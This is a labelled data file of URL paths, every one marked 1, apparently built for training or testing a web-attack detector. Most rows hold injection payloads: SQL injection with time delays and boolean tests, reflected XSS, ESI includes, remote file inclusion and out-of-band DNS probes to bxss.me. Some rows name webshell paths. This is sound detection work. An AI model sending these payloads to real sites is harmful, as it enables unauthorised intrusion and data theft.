sentences	labels
module/**********/visit.jsp?i_articleid=239572&i_webid=1&i_columnid=37&type=3 and 1=1 	 1
module/**********/visit.jsp?i_columnid[0]=exp&i_columnid[1]==convert(int,sys.fn_sqlvarbasetostr(hashbytes('md5','1188843706')))&i_webid=1&type=1 	 1
jsearchfront/********/jcse'||'/110105008056111/16/images/plugin/selectpick/js.js 	 1
xxgk%' and 2*3*8=6*8 and 'qir5'!='qir5%/******/zfczyjs/list.html 	 1
vc/http://*******/t/fit.txt/lib/easyui/plugins/jquery.linkbutton.js 	 1
gygj/*********/admin/notificationpopup.php?new=1&type=cr&height=alert(777) 	 1
system/********/interview/room.jsp?wbinterviewid=1033%' and 4118=9913 and '%%'='%&owner=1707212448 	 1
2016zt/******/2016/03/02/javascript:window.print() 	 1
xxgk'||'/*****/1088/1105/list.html 	 1
was5/***/search?channelid=234439&orderby=relevance' and 7051=7051  	 1
images/*/language.js/<img src="javascript:alert(7564)"> 	 1
socket.gethostbyname('hitwv' 'asaulhyx94a73.bxss.me.')[3].to_s) '/*****/hfswsj/zmhdyc.html 	 1
swwj/******/2021/09/15/javascript:window.close(); 	 1
qhsw/******/2020/04/01/javascript:window.close(); 	 1
zwgk/zdlygk%' and 2*3*8=6*8 and 'jsbf'!='jsbf%/*******/ycs/hlx.htm 	 1
xinanyanjiu/*************/nongchanpin/2021-01-14/0'xor(if(now()=sysdate(),sleep(3),0))xor'z.html 	 1
qhly/******/2012/04/06/javascript:dozoom(14) 	 1
was5/***/search?searchword=??????&channelid=254846 and 1=1 	 1
jsearchfront/********/jcse/110105008056111/16/images/plugin/websitechange/zwfwv3'||'.js 	 1
lxwm/****/job/lib/ap_resume_workcity.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects) 	 1
col/http://*******/t/xss.html? 	 1
module/********/downfile.jsp?classid=0&filename=8ffb8746f7374969ba1a903f538b94d4.doc%' and 7471=2837 and '%'=' 	 1
lccp/********/javascript:void(0); 	 1
news/********/pinpaijianshe?page=1 and 2489=5073# 	 1
jsearchfront/**********/dimension.do?begin=&end=&eq=&oq=&p=1&pg=1&pos=&pq=&q=请输入关键词&searchid=1&tpl=16&websiteid=0'xor(if(now()=sysdate(),sleep(15),0))xor'z 	 1
xxgk/zzxxgk'""()&%<acx><script >8m5j(9279)</script>/***/zfxxgkml_2127/xwfbh_2065/list.html 	 1
ru/************/function/?command=getxmllisting&format=jsonobj&path=%<script>alert(777)</script>&random=0.3300707341372783 	 1
css/*********/admin/notificationpopup.php?new=1&type=cr&height=alert(777) 	 1
col/*****/index'""()&%<acx><script >v8q9(9777)</script>.html 	 1
xwdt/****/gcjsbzgl' and 2*3*8=6*8 and 'cbhn'='cbhn/gcjybz.htm 	 1
tscp/********/javascript:void(0); 	 1
icons/********/loggedout.jsp?locale=""><script>alert(777)</script> 	 1
xwdt'||'/****/czjs/gzdt.htm 	 1
templets/******/booklist.php 	 1
0'xor(if(now()=sysdate(),sleep(15),0))xor'z/**/lib/easyui/plugins/jquery.draggable.js 	 1
module/*****/ckplayer/ckplayer.js/""><script>alert(1238)</script>?_=1630311813673 	 1
module/********/downfile.jsp?classid=0&filename=278851335f24465a9715e09ab5f36d60.docx and 2548=7223-- tydm 	 1
template/****/myspace/student.php?keyword=31337"" onmouseover=confirm(777)//&active=0&_qf__search_user=&submit=search 	 1
es/*******/booking/eventlist.php?serviceid=1337" onmouseover="alert(777) 	 1
zwgk/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/********/1.htm 	 1
lz/****/javascript:void(0); 	 1
newscenter/******/2021/07/25/013425058.shtml 	 1
jsearchfront/********/jcse'||'/110105008056111/16/images/plugin/voice/hzrecorder.js 	 1
xq/******/2021/12/09/javascript:void(0); 	 1
ldzc/*****/sz/'""()&%<acx><script >aavn(9449)</script>/t20210806_185416.html 	 1
xwzx/***/images/ 	 1
dcwj/******/news/show/title/"><script>alert(777)</script>time-for-a-heavy-harvest-new-release/src/@random4cd201e063d5c 	 1
vc/**/interface/ 	 1
module/********/downfile.jsp?classid=0&filename=06c080ad774b497c8312530658e028b8.doc') and 1=2 and ('1'='1 	 1
zwgk/****/'""()&%<acx><script >5vc5(9813)</script>/gdyx/ 	 1
was5/***/search?searchword=1&channelid=287219%' and 4400=3632 and '%%'='%&perpage=24&templet=1&token=1 	 1
xxgk/******/tjj/zfxxgkml_2127/jgzn_2042/list.html?new="".gethostbyname(lc(""hitcb"".""jpxidtdla2b74.bxss.me."")).""a"".chr(67).chr(hex(""58"")).chr(118).chr(66).chr(108).chr(70)."" 	 1
was5/***/search?channelid=222832&searchword=; waitfor delay '0:0:2 	 1
plus/*********/plus/90sec.php 	 1
z/191211-8/*****/543527'""()&%<acx><script >i44y(9665)</script>b53aa888f3c059262ff1665247.css 	 1
gjjtwzq/************/function/?command=getxmllisting&format=jsonobj&path=%<script>alert(777)</script>&random=0.3300707341372783 	 1
swld/******/2017/06/06/javascript:window.print() 	 1
template/***/sa3/addholiday.do 	 1
dqgg/********/javascript:void(0); 	 1
vc/**/lib/easyui/themes"" and 2*3*8=6*8 and ""ngj9""=""ngj9/bootstrap/messager.css 	 1
lcgg/********/javascript:void(0); 	 1
lz/******/2021/07/07/javascript:void(0); 	 1
inc/**********/index.php?currency="><script>alert(777);</script>&product_id=109"><script>alert(777);</script>&rt=product/product 	 1
xwdt/****/zjdt/gzdt'||'/144.htm 	 1
cpsms/********/javascript:void(0); 	 1
pic/*/01/30/79/1307910_544389.jpg 	 1
xxgk/*****/dash_additem.php?additem_form=alert(777); 	 1
wxb/******/201801/t20180115_669144.html 	 1
news/********/fengxianjingshi?page=1 and 0410=2066-- 	 1
news/********/jishuchuangxin?page=1%') and 1=dbms_pipe.receive_message(chr(90)||chr(80)||chr(71)||chr(74),6)--  	 1
xwzx/****/"".gethostbyname(lc(""hitaw"".""pfqhnbbyd2ca2.bxss.me."")).""a"".chr(67).chr(hex(""58"")).chr(119).chr(77).chr(110).chr(86).""/ 	 1
was5/***/search?page=-1) or 9041=6266#&channelid=253477&searchword=1&keyword=1&orderby=-docreltime&perpage=15&outlinepage=10 	 1
jsearchfront/********/jcse<esi:include src=""http://bxss.me/rpb.png""/>/110105008056111/16/images/plugin/waterpull/pinterest_grid.js 	 1
jsearchfront/categorysearch.do?cateid=1&eq=1&oq=1&p=1&pg=15&pos=1&pq=1&q=请输入关键词&ranksign=1&searchid=1&total=bxss.me/*/xss.html? 	 1
ddjs/**********/index.php?rt=product/manufacturer&manufacturer_id=15"><script>alert(777);</script> 	 1
system/********/js%' and 2*3*8=6*8 and '1prw'!='1prw%/ajax.js 	 1
wp-content/*******/nextgen-gallery/nggallery.php?test-head='"">alert(777); 	 1
blog/wp-content/*******/easyrotator-for-wordpress/guzhici.php 	 1
ldzc/*****/sz/202108/t20210806_185416.html?leader="".gethostbyname(lc(""hituh"".""lzqyavbw494f5.bxss.me."")).""a"".chr(67).chr(hex(""58"")).chr(97).chr(90).chr(121).chr(69)."" 	 1
col%' and 2*3*8=6*8 and 'en5d'!='en5d%/*****/index.html 	 1
index/******/2021/08/20/javascript:void(); 	 1
was5/***/search?channelid=299868&perpage=1000') and 1488=1488 and '1'='1 	 1
2016zt/****/index.shtml/<img src="javascript:alert(332)"> 	 1
zzsl/******/202107/"".gethostbyname(lc(""hitez"".""vbjoqsfa8c19b.bxss.me."")).""a"".chr(67).chr(hex(""58"")).chr(107).chr(73).chr(115).chr(86).""_2938511.html 	 1
fr/****/xwygx/202109/t20210930_317981.html and 1>1 	 1
vc/ui'""()&%<acx><script >b7ng(9824)</script>/*******/scrollup/css/themes/image.css 	 1
xxgk/******/tjj'||'/zfxxgkml_2127/hygq_2064/list.html 	 1
was5/***/search?channelid=254846&searchword=天津 and 9086=(select 9086 from pg_sleep(5)) 	 1
ddjs/****/202012/t20201221_265273.html and 1=1 	 1
zwgk' and 2*3*8=6*8 and 'l2bv'='l2bv/******/bzxajgc1/1.htm 	 1
index/******/2013/12/31/011275111.shtml 	 1
zwxx_11337/****/201909/t20190916_1740542.html 	 1
kibana/***/saved_objects/_find?fields=title&per_page=1&search=*&search_fields=title&type=index-pattern 	 1
index/******/2021/11/02/javascript:window.print() 	 1
public/**********/tabledata.jsp?server=localhost&db=mysql&table=""/>alert(777); 	 1
jsearchfront/******/mainframe.do?begin=&end=&eq=&oq=0'xor(if(now()=sysdate(),sleep(15),0))xor'z&p=1&pg=1&pos=&pq=&q=请输入关键词&searchid=1&tpl=16&websiteid=110105008056111 	 1
module/*****/ckplayer/ckplayer.js/<img src="javascript:alert(710)">?_=1630311559131 	 1
if(now()=sysdate(),sleep(15),0)/****/bmleft.html 	 1
ztzl/********/wzqh_qwjd/202011/t20201130_259587.html' and 'x'='x 	 1
zwgk' and 2*3*8=6*8 and 'tjrv'='tjrv/******/ncwywfgz/wzs/qtxs/xmb_gzdxb.htm 	 1
'""()&%<acx><script >j2yp(9130)</script>/**/lib/easyui/themes/bootstrap/linkbutton.css 	 1
wp-content/*******/wp-booking-calendar/public/ajax/getmonthcalendar.php?wpml_lang=&calendar_id=1&month=4&publickey=6lcdyoasaaaaacsevy6g4yo1bqxcgw15s15mb36- &year=<script language='php'>echo 10516*61501;</script> 	 1
was5/***/search/search?page=3&channelid=287219') and 7674=(select 7674 from pg_sleep(5)) and ('msgp'='msgp&searchword=1&keyword=1&orderby=-docreltime&perpage=7&outlinepage=10 	 1
module/*****/ckplayer/ckplayer.js/""><script>alert(620)</script>?_=1630311535666 	 1
system/********/if(now()=sysdate(),sleep(12),0)/newcalendar/my97datepicker.htm 	 1
outurl/*****/system.html?step=2&device=et"/><script>alert(777);</script>bh0 	 1
module/**********/visit.jsp?i_columnid=1&i_webid=1"and/**/extractvalue(1,concat(char(126),md5(1406936615)))and"&type=1 	 1
ztzl/********/wzqh_qydt/202012/t20201205_264448.html' and 'x'='x 	 1
ztzl/********/wzqh_zyjs//*/-->'""></iframe></script></style></title></textarea><script >alert(26423)</script> 	 1
ldzc/*****/201912/t20191230_145977.html?leader="".gethostbyname(lc(""hitre"".""xtupaaoxff5d3.bxss.me."")).""a"".chr(67).chr(hex(""58"")).chr(108).chr(90).chr(110).chr(66)."" 	 1
ztpd//***/5b9mt7hd/xhr_send?t=1629436664774 	 1
ztzl/****/job/lib/ap_resume_workcity.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects1) 	 1
2020zt/******/2020/06/04/javascript:void(); 	 1
was5/***/sys/listabd2.jsp?bd="/><script>alert(777)</script> 	 1
cpsms/********/javascript:void(0); 	 1
qhly/******/2020/12/02/javascript:window.close(); 	 1
lz/******/2021/07/23/javascript:void(0); 	 1
module/********/downfile.jsp?classid=0&filename=278851335f24465a9715e09ab5f36d60.docx and 7846=8652 	 1
xinanyanjiu/************/guzhiqihuo/2021-0""xor(if(now()=sysdate(),sleep(9),0))xor""z-22/1713.html 	 1
module/*****/ckplayer/ckplayer.js/<img src="javascript:alert(205)">?_=1630311327038 	 1
cpsms/********/javascript:void(0); 	 1
0""xor(if(now()=sysdate(),sleep(15),0))xor""z/*/layout.css 	 1
template/****/admin/configure_extensions.php?display=</script><script>confirm(777)</script> 	 1
index/******/2019/10/18/javascript:void(0); 	 1
qhly/******/2018/08/22/javascript:window.close(); 	 1
shzr/*************/ajax_managed_services.php 	 1
xwdt%' and 2*3*8=6*8 and 'zqj5'!='zqj5%/****/ghby/gzdt/1.htm 	 1
socket.gethostbyname(""hitel"" ""crzuykif4f453.bxss.me."")[3].to_s) ""/***************/16/images/result.css 	 1
images'||'/*/hanweb.css 	 1
vc/**/widgets/scrollup/css/themes/0'xor(if(now()=sysdate(),sleep(15),0))xor'z.css 	 1
module/*****/ckplayer/ckplayer.js/"><script>alert(1202)</script>?_=1630311796458 	 1
art/****/10/11/art_http://bxss.me/t/xss.html? 	 1
lz/******/2021/09/27/javascript:void(0); 	 1
zwgk/if(now()=sysdate(),sleep(12),0)/********/1.htm 	 1
pic/***/11/09/90/11099074_998345.jpg 	 1
socket.gethostbyname('hitrf' 'rslqqevdca891.bxss.me.')[3].to_s) '/*******/jquery.panel.js 	 1
uploads/****/diretory.php 	 1
jsearchfront/********/jcse/'""()&%<acx><script >jfeu(9737)</script>/16/images/searchbtn.js 	 1
jsearchfront/********/jcse/110105008056111/16/images/plugin/waterpull'||'/pinterest_grid.js 	 1
pic/*/11/38/74/11387446_426302.jpg 	 1
swld/******/2021/02/10/javascript:window.print() 	 1
public/**********/index.php?currency="><script>alert(777);</script>&product_id=109"><script>alert(777);</script>&rt=product/product 	 1
com1/wp-admin/admin.php?page=thecartpress/*****/addressedit.php&address_id='"><script>alert(77729;</script> 	 1
qtyz/****/admin/configure_extensions.php?display=</script><script>confirm(777)</script> 	 1
zwgk/****/bmyjs/zzqdwzfbmgljgsydw/zzqxxhjsb/\"javascript:void(0)\" 	 1
fxgg/********/javascript:void(0); 	 1
col/****/index.html/""><script>alert(322)</script> 	 1
pic/*/10/08/90/10089020_823365.jpg 	 1
ldzc/http://*******/t/xss.html? 	 1
zwgk/****/bmjs/zzqjcyxt/jfqrmjcy/\"javascript:void(0)\" 	 1
xwzx/****/2020_szyw/' and 'x'='x 	 1
jsearchfront/********/jcse/110105008056111//xfs.bxss.me/images/css.js 	 1
swld/******/2021/12/06/javascript:window.close(); 	 1
was5/***/search?searchword=1&channelid=287219%' and 1=dbms_pipe.receive_message(chr(90)||chr(80)||chr(71)||chr(74),6)-- &perpage=24&templet=1&token=1 	 1
e/action'||'/********/ 	 1
art"" and 2*3*8=6*8 and ""plj7""=""plj7/****/7/12/art_35_234319.html 	 1
zwgk/****/bmyjs/zzqfyxt/hyxrmfy/\"javascript:void(0)\" 	 1
wla/*********/comul_total.json.jsp?callback=jquery171030196352313975305_1632325579271') or 9918=9918  	 1
ztpd/******/count/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 1
xxgk/******/list' and 2*3*8=6*8 and 'svtg'='svtg.html 	 1
yhk/********/1710.html/*/-->'""></iframe></script></style></title></textarea><script >alert(12622)</script> 	 1
ldzc/****/swsj' and 2*3*8=6*8 and 'esoq'='esoq/ 	 1
synr/*****/edit.php?title="">pt>alert(777);< /script>pt> 	 1
socket.gethostbyname('hitvc' 'qjhngaqfacbb7.bxss.me.')[3].to_s) '/**/images/main.css 	 1
include/******/ci.php 	 1
xwdt/if(now()=sysdate(),sleep(12),0)/********/gcjybz/1.htm 	 1
ldzc/****/swsj/201610/t20161010_456.html?leader=苏君'""()&%<acx><script >pizc(9255)</script> 	 1
jsearchfront/********/jcse/110105008056111/16/images/plugin/http://bxss.me/t/fit.txt/zwdt_v3.css 	 1
theme/*************/<img src="javascript:alert(17)"> 	 1
jsearchfront/template'||'/****/110105008056111/16/images/common.js 	 1
was5/***/search?channelid=253477&keyword=the&orderby=0""xor(if(now()=sysdate(),sleep(15),0))xor""z&outlinepage=10&page=2&perpage=15&searchword=the 	 1
module/*****/ckplayer/ckplayer.js/"><script>alert(373)</script>?_=1630311380750 	 1
module/********/downfile.jsp?classid=0') and 3223=3223 and ('eure'='eure&filename=f8c2ed3e25ea4c269bf2e627a90b568a.docx 	 1
newscenter/**********/javascript:void(); 	 1
module/*****/ckplayer/ckplayer.js/""><script>alert(511)</script>?_=1630311495191 	 1
xwdt/****/zjdt' and 2*3*8=6*8 and 'beze'='beze.htm 	 1
zwgk/*******/if(now()=sysdate(),sleep(12),0)/ghxx.htm 	 1
xxgk/******/api-getmodel-api-sql-sql=select concat(account,0x7a656e74616f636d735f73716c5f73716c69) from zt_user 	 1
module/***/rssfeed.jsp?colid=34%';select sleep(5) 	 1
col/*****/index.html/""><script>alert(915)</script> 	 1
module/**********/visit.jsp?i_articleid[0]=exp&i_articleid[1]==extractvalue(1,concat(char(126),md5(1003116456)))&i_columnid=15&i_webid=1&type=3 	 1
news/********/zhikubaogao?page=1' or 6437=2802 /* 	 1
was5/***/search?channelid=254846&searchword=北京' && benchmark(2999999,md5(now())) order by 160  	 1
was5/***/search?channelid=299868&perpage=1000') and 8651=8651 and ('1'='1 	 1
socket.gethostbyname('hityg' 'axrimmwsd2d4d.bxss.me.')[3].to_s) '/******/searchbtn.js 	 1
jsearchfront/********/jcse/110105008056111/16/images/plugin/voice/voicerecorder'||'.js 	 1
lxwm/****/admin/configure_extensions.php?display=</script><script>confirm(777)</script> 	 1
u6ca1/*******/diary/new/submit.php 	 1
images/****/messages/outbox.php?f=social"" onmouseover=""confirm(777) 	 1
xxgk/******/fzrxc/ 	 1
news/********/redianguanzhu?page=1 and 2150=2150-- 	 1
z/170822-'""()&%<acx><script >yzkr(9042)</script>/*****/0a0f5da36e596bc2aa4482bbd409d1ea.css 	 1
news/********/silugonggao?page=1'"()&%<acu><script>9112(9131)</script> 	 1
xxgk/******/tjj/zfxxgkml%' and 2*3*8=6*8 and 'xf0y'!='xf0y%_2127/hygq_2064/list.html 	 1
zfld/******/2021/12/06/javascript:window.print() 	 1
xxgk/******/201806/ 	 1
qhly/******/2017/02/15/javascript:dozoom(12) 	 1
tupian/************/<img src="javascript:alert(182)"> 	 1
2021zt/******/2021/06/09/javascript:void(); 	 1
fzgn' and 2*3*8=6*8 and 'cfte'='cfte/****/ 	 1
system/********/code/datainput.jsp?owner=') or 7902=7763  	 1
pic/*******/gvideos.php?gid=1 and 1=2 	 1
lz/******/2021/07/16/javascript:void(0); 	 1
2011zt/******/2011/12/01/010556888.shtml 	 1
inc/************/index?search="">alert(/777/) 	 1
module/*****/ckplayer/ckplayer.js/"><script>alert(461)</script>?_=1630311416553 	 1
qyzz/***/ltgsz.com?n=11';select sleep(5)# 	 1
qhly/******/2021/05/07/javascript:dozoom(9) 	 1
system/********/interview/room.jsp?wbinterviewid=1033%' or 8876=6831 and '%%'='%&owner=1707212448 	 1
zfld/******/2020/08/26/javascript:window.close(); 	 1
jsearchfront'||'/********/jcse/110105008056111/16/images/plugin/analysis/jquery.windstagball.js 	 1
swld/******/2021/10/16/javascript:window.print() 	 1
system/********/interview/room.jsp?wbinterviewid=1033') and 2512=2512 and ('1'='1&owner=1707212448 	 1
vc/**/widgets/scrollup/js/http://bxss.me/t/fit.txt.js 	 1
socket.gethostbyname(""hityi"" ""rhekvivta103e.bxss.me."")[3].to_s) ""/******/ie6fixed/ie6fixed.js 	 1
swwj/******/2021/03/03/javascript:window.print() 	 1
public/**********/index.php?limit="><script>alert(777);</script>&page=1"><script>alert(777);</script>&rt=product/special"><script>alert(777);</script>&sort="><script>alert(777);</script> 	 1
synr/****/search.php?query=""onmouseover=""alert(1); 	 1
en/***********/projectcontracting/201412/ 	 1
system/********/interview/room.jsp?wbinterviewid=1033&owner=1707212448%') and 9711=9711 and '%'=' 	 1
2017zt/******/2019/08/27/javascript:window.print() 	 1
ztpd/*****/default/install_plugin/dasdasdasdad?plugin=math2py&source=javascript:alert(777) 	 1
wzdt//***/on70wgty/xhr_send?t=1632344370370 	 1
e/******/viewclick/?addclick=1&classid=1 waitfor delay '0:0:12.591000000000001' -- &id=1285 	 1
zfld/******/2021/09/07'"/><img src=javascript:alert(1474) /013446963.shtml 	 1
qtyz/******/common/signin.aspx?tbpassword=alert(777)returnurl=/******/common/default.aspx 	 1
xxgk/*****/1088/1101/list.html?new=0.5927188119755153<esi:include src=""http://bxss.me/rpb.png""/> 	 1
was5/***/search?channelid=299868%') or 2180=2180 /*&perpage=1000 	 1
lz/******/2021/10/08/012205521.shtml 	 1
jsearchfront/********/jcse/110105008056111/16/bxss.me/main.css 	 1
qhsw/******/2021/04/22'"/><iframe src=javascript:alert(2461) /013373702.shtml 	 1
2012zt/****/cx/"><script>alert(561)</script> 	 1
hdjl/http://*******/t/fit.txt/202103/t20210303_2614145.html 	 1
newscenter/******/more/252000000000000/0001/javascript:void(); 	 1
swld/******/2021/09/08/"'><img src="/wf_xsrf1580.html">.shtml 	 1
zmhd/http://*******/t/fit.txt?.jpg/ 	 1
jsearchfront/********/jcse/http://bxss.me/t/fit.txt?.jpg/16/images/ui.css 	 1
2017zt/******/2017/12/20/javascript:window.close(); 	 1
qhly/******/2021/05/26/javascript:dozoom(14) 	 1
zwgk/zdlygk' and 2*3*8=6*8 and 'eilq'='eilq/********/zws/hyx/xmb_gzdxb.htm 	 1
icons/*****/ccmanage.php?find_enc=1&list=1"><script>alert(777)</script> 	 1
article/******/202006121540031139.html 	 1
ldzc/*****/201610/t20161016_542.html?leader=贾汝昌'""()&%<acx><script >x0cu(9377)</script> 	 1
module/********/downfile.jsp?classid=0&filename=aa5b6197abf74d70b14ec83b8819378f.doc%' and 2386=8633 and '%'=' 	 1
article/******/201907111629351106.html 	 1
jsearchfront/template<esi:include src=""http://*******/rpb.png""/>/jcse/110105008056111/16/images/jquery.cookie.js 	 1
jsearchfront/**********/autocomplete.do?begin=1&end=1&eq=1&oq=1&p=1&pg=1&pos=1&pq=1&q=请输入关键词&searchid=1&tpl=16&websiteid=0""xor(if(now()=sysdate(),sleep(15),0))xor""z 	 1
zwgk/****/bmjs/zzqfyxt/gyszjfy/\"javascript:void(0)\" 	 1
jsearchfront/'""()&%<acx><script >lzxm(9755)</script>/****/110105008056111/16/images/plugin/criteria/criteria.js 	 1
system'||'/********/js/vsb_news_search_entry.js 	 1
wp-content/*******/login-wall-xzjmr/login_wall.php?login=cmd 	 1
nul/******/common/signin.aspx?tbpassword=alert(777)returnurl=/******/common/default.aspx 	 1
include/******/yu.php 	 1
ztzl/************/index?search="">alert(/777/) 	 1
news/********/haiwaixinwen?page=1%') and 1=dbms_pipe.receive_message(chr(90)||chr(80)||chr(71)||chr(74),0)--  	 1
data/*****/admincat.php 	 1
pic/*/10/31/12/10311241_987253.jpg 	 1
jsearchfront/*********/career.do?redirectaction:http://static.bxss.me/ 	 1
pic/*/00/49/80/498020_560828.jpg 	 1
zfld/******/2021/12/13/javascript:window.print() 	 1
ddjs/****/job/lib/ap_resume_intention.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects) 	 1
vc/**/widgets/hanweb/validity"" and 2*3*8=6*8 and ""aaxu""=""aaxu/css/validity.css 	 1
jsearchfront/********/http://bxss.me/t/fit.txt/website.js 	 1
zmhd/*****/hfswsj/bxss.me/t/xss.html? 	 1
web/********/fonts/fontawesome-webfont.ttf?v=javascript:window.top._web_js_namespace_taint_tracer.log_execution_flow_sink()// 	 1
xwd/********/javascript:void(0); 	 1
news/********/zhongguoxinwen?page=1' and 1=dbms_pipe.receive_message(chr(90)||chr(80)||chr(71)||chr(74),6)--  	 1
module/**********/visit.jsp?i_articleid=221610&i_columnid=if(now()=sysdate(),sleep(15),0)&i_webid=1&type=3 	 1
jsearchfront/********/jcse/110105008056111/16/http://bxss.me/t/fit.txt?.jpg/style.css 	 1
qywh/***/sa3/addholiday.do 	 1
xinanyanjiu/************/guzhiqihuo' and 2*3*8=6*8 and 'yyu4'='yyu4/2021-01-22/1713.html 	 1
ztzl/******/djbn_zyjh/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 1
js/*********//swfupload_f8.swf?moviename="]);}catch(e){}if(!self.a)self.a=!alert(1);// 	 1
qtyz/**********/tabledata.jsp?server=localhost&db=mysql&table=""/>alert(777); 	 1
news/********/maoyizixun?page=1 and 2102=8529# 	 1
jsearchfront/********/jcse/110105008056111/16/images/searchbtn.js/<img src="javascript:alert(4668)"> 	 1
zwgk/******/ncwywfgz/zws/yzq/if(now()=sysdate(),sleep(12),0).htm 	 1
index/****/js/data.js/<img src="javascript:alert(339)"> 	 1
vc/**//xfs.bxss.me/security/sm2.js 	 1
jsearchfront/template'||'/****/110105008056111/16/images/plugin/voice/hzrecorder.js 	 1
ywly/*****/index.html?continent=%' or 8889=8362  	 1
system/********/js%' and 2*3*8=6*8 and 'tx2e'!='tx2e%/formfunc.js 	 1
jsearchfront/********/jcse/http://bxss.me/t/fit.txt?.jpg/16/images/plugin/waterpull/pinterest_grid.js 	 1
es/****/xwygx/202109/t20210930_318020.html" and "x"="y 	 1
newscenter/******/2013/11/13/011232451.shtml 	 1
zwgk/****/bmyjs/zzqdwyzfpcjgyzsjgyzssydw/zzqdx/\"javascript:void(0)\" 	 1
zfld/******/2021/12/20/javascript:window.print() 	 1
qhly/******/2016/09/06/javascript:dozoom(14) 	 1
module/********/downfile.jsp?classid=0&filename=72a64bf486d74bca8643c56c4ce11e27.doc' and 2*3*8=6*8 and 'obb1'='obb1 	 1
lccp/********/javascript:void(0); 	 1
zwgk/****/bmjs/sydw1/zzqskylgbjdaj_1820/\"javascript:void(0)\" 	 1
xwdt/****/czjs/0""xor(if(now()=sysdate(),sleep(12),0))xor""z/1.htm 	 1
news/********/guowaishichangzhunru?page=1%') and 1=dbms_pipe.receive_message(chr(90)||chr(80)||chr(71)||chr(74),0)--  	 1
newscenter/******/2021/11/02/javascript:void(0); 	 1
module/*****/ckplayer/ckplayer.js/<img src="javascript:alert(3589)">?_=1630311960993 	 1
zwgk/*******/fdzdgknr/ysjs' and 2*3*8=6*8 and 'd827'='d827/1.htm 	 1
'""()&%<acx><script >vejj(9365)</script>/**/widgets/hanweb/ie6fixed/ie6fixed.js 	 1
kjcx/****/fzzl/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 1
lz/****/javascript:void(0); 	 1
'""()&%<acx><script >02im(9922)</script>/***/jquery.ellipsis.js 	 1
zwgk/"".gethostbyname(lc(""hitur"".""prriooct679cb.bxss.me."")).""a"".chr(67).chr(hex(""58"")).chr(121).chr(79).chr(104).chr(80).""/****/gdyx/ 	 1
zwgk/****/bmjs/zzqfyxt/ycxzjrmfy/\"javascript:void(0)\" 	 1
jsearchfront'""()&%<acx><script >qamc(9895)</script>/********/jcse/110105008056111/16/images/main.css 	 1
index/******/2020/06/24/javascript:void(0); 	 1
col/******/index<esi:include src=""http://bxss.me/rpb.png""/>.html 	 1
pic/*****/dash_status.php?status_data[1]=alert(777); 	 1
es/****/magpierss/scripts/magpie_simple.php?url=""><img src= x onerror = alert(777)>url=""> 	 1
jsearchfront/********/jcse/110105008056111/16/images//xfs.bxss.me/voice/voice.css 	 1
vc/**/lib/easyui/plugins/jquery.draggable"" and 2*3*8=6*8 and ""ctdc""=""ctdc.js 	 1
photo/*****/liangkaoxie.php 	 1
system/********/interview/room.jsp?wbinterviewid=1033&owner=1707212448%' and 7577=7577  	 1
2020zt/******/2021/11/26/javascript:window.close(); 	 1
qhly/******/2013/08/09/javascript:window.close(); 	 1
ru/******/index.php?tid=default&lid=en_uk&f_email="">alert(777) 	 1
2016zt/******/2016/12/09/javascript:void(0); 	 1
system/********/storage/localupload.jsp?doaction=save' and 3464=6845 and '1'='1&rid=1rnott09fg&uptoken=1ff87566684b40c688f756b86e2c3798 	 1
wp-content/*******/woocommerce/wpwp.php 	 1
cpsms/********/javascript:void(0); 	 1
wp-content/*******/wp-events-calendar/public/ajax/geteventslist.php?calendar_id=1&day=1&month=5&pag=1&year=2018' and 1=dbms_pipe.receive_message(7d,15) and '1'='1 	 1
ldzc<esi:include src=""http://*******/rpb.png""/>/byszf/sz/202108/t20210806_185416.html 	 1
system/********/js' and 2*3*8=6*8 and 'bsch'='bsch/gotopage.js 	 1
admin/*******/date.php 	 1
qhsw/******/2020/04/01/javascript:window.print() 	 1
vc"" and 2*3*8=6*8 and ""kzdt""=""kzdt/**/widgets/scrollup/css/themes/image.css 	 1
com1/*******/booking/eventlist.php?serviceid=1337" onmouseover="alert(777) 	 1
xwdt/if(now()=sysdate(),sleep(12),0)/********/gcjybz.htm 	 1
qywh/****/messages/outbox.php?f=social"" onmouseover=""confirm(777) 	 1
z/191211-8/*****/http://bxss.me/t/xss.html? 	 1
images<esi:include src=""http://*******/rpb.png""/>/select.css 	 1
